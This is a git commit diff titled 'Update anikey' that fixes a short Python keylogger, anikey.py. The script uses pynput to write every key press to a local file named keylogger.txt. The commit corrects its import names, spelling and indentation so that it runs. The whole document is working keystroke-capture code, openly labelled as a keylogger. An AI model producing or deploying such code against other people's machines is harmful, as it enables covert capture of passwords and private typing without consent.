af1f77dcc88b723373a0dc96351e050a526e9013
Anifl0310 <annieflorance01@gmail.com>
2024-06-17 15:10:58 +0530

    Update anikey

--- anikey.py
+++ anikey.py
@@ -1,8 +1,9 @@
 import pynput
-from pynput.keyboard import key, Listener
+from pynput.keyboard import Key, Listener
 
 def on_press(key):
-  with open('keylogger.txt', 'a') as f:
-    f.write(f'{key}\n')
-with Listner(on_press=on_press) as listener:
+    with open('keylogger.txt', 'a') as f:
+        f.write(f'{key}\n')
+
+with Listener(on_press=on_press) as listener:
     listener.join()
